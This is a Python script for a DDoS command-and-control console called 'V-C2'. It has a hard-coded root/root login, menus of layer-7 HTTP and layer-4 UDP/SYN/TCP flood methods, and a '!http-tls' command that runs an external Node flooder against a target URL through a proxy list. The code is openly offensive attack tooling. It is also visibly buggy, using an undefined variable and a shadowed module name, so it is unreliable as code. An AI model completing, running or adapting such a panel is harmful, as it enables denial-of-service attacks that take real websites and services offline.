# include#
import socket
import os
import requests
import random
import getpass
import time
import sys
import colorama


# color
def color(data_input_output):
    color_codes = {
        "GREEN": "\033[32m",
        "LIGHTGREEN_EX": "\033[92m",
        "YELLOW": "\033[33m",
        "LIGHTYELLOW_EX": "\033[93m",
        "CYAN": "\033[36m",
        "LIGHTCYAN_EX": "\033[96m",
        "BLUE": "\033[34m",
        "LIGHTBLUE_EX": "\033[94m",
        "MAGENTA": "\033[35m",
        "LIGHTMAGENTA_EX": "\033[95m",
        "RED": "\033[31m",
        "LIGHTRED_EX": "\033[91m",
        "BLSYN": "\033[30m",
        "LIGHTBLSYN_EX": "\033[90m",
        "WHITE": "\033[37m",
        "LIGHTWHITE_EX": "\033[97m",
    }

    return color_codes.get(data_input_output, "")


lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")
red = color("LIGHTMAGENTA_EX")


# p1#
def clear():
    os.system("cls" if os.name == "nt" else "clear")


proxys = open("loader/proxy.txt").readlines()
bots = len(proxys)


# p2#
def home():
    clear()
    print(
        f"""
‎ ‎ ‎ {red}██╗   ██╗       ██████╗██████╗ 
‎ ‎ ‎ {red}‎██║   ██║      ██╔════╝╚════██╗
‎ ‎ ‎ {red}‎██║   ██║█████╗██║      █████╔╝
‎ ‎ ‎ ‎ {red}‎‎██╗ ██╔╝╚════╝██║     ██╔═══╝ 
 ‎ ‎ ‎ ‎{red}‎╚████╔╝       ╚██████╗███████╗
  ‎ ‎ ‎ ‎{red}╚═══╝         ╚═════╝╚══════╝
    {lightwhite}WELCOME BACK TO V-C2
      {lightwhite}MADE BY {gray}@CIA_GOV
      {lightwhite}ONLINE BOT = {red}{bots}"""
    )


def help():
    print(
        f"""
LAYER7  > SHOW LAYER7 METHODS
LAYER4  > SHOW LAYER4 METHODS
RULES   > RULES PANEL
TOOLS   > SHOW TOOLS
CLEAR   > CLEAR TERMINAL
            """
    )


def rules():
    print(
        f"""
    > ATTACKING THE .PS/.RU DOMAIN IS PROHIBITED
    > DO NOT CONTINUE ATTACKS AT THE SAME TIME 
    > MUST HAVE AN HTTP PROXY 
    > DOES NOT PROVIDE ADDITIONS 
    > CAN ONLY PORT 80/443"""
    )


def layer7():
    print(
        f"""
    HTTP-STORM
    HTTP-ZERO
    HTTP-BROWSER
    HTTP-ENGINE
    HTTP-TLS
    HTTP-HCAP
    HTTP-CF"""
    )


def layer4():
    print(
        f"""
    UDP
    SYN
    TCP"""
    )


def main():
    home()
    command = input('''{lightwhite}root@root# ''')
    command = input()
    if command == "cls" or command == "!clear":
        clear()
        home()
    elif command == "help" or command == "!help":
        help()
    elif (
        command == "layer7"
        or command == "LAYER7"
        or command == "!l7"
        or command == "L7"
        or command == "Layer7"
    ):
        layer7()
    elif (
        command == "layer4"
        or command == "LAYER4"
        or command == "!l4"
        or command == "L4"
        or command == "Layer4"
    ):
        layer4()
    elif command == "exit":
        exit()
    elif command == "!http-tls":
        try:
            url = cnc.split()[1]
            time = cnc.split()[4]
            os.system(f"node loader/TLS.js {url} {time}")
        except IndexError:
            print("Usage: !http-tls <target> <time>")
            print("Example: !http-tls https://google.com 60")
    else:
        try:
            command = cnc.split()[0]
            print("Command: [ " + command + " ] Not Found!")
        except IndexError:
            pass


# end
def login():
    clear()
    user = "root"
    passwd = "root"
    username = input("Username: ")
    password = getpass.getpass(prompt="Password: ")
    if username != user or password != passwd:
        print("")
        print("Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to V-CnC!")
        time.sleep(0.3)
        main()


login()
